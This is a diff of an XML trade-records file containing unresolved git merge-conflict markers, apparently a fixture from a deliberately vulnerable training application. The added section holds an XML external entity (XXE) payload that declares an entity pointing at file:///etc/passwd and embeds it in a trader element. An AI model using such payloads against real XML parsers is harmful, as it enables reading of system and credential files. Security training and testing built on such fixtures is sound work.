@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <?xml version="1.0" encoding="UTF-8"?>
 
 <!DOCTYPE foo [<!ELEMENT foo ANY >
@@ -19,4 +20,27 @@
         <units>4500</units>
         <price>195</price>
     </metadata>
+=======
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<trades>
+    <metadata>
+        <name>Apple Juice</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Lemon Juice</name>
+        <trader>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+    </metadata>
+>>>>>>> 935e6ccb8c624a081a7bfd33d47ad04fe2097d21
 </trades>
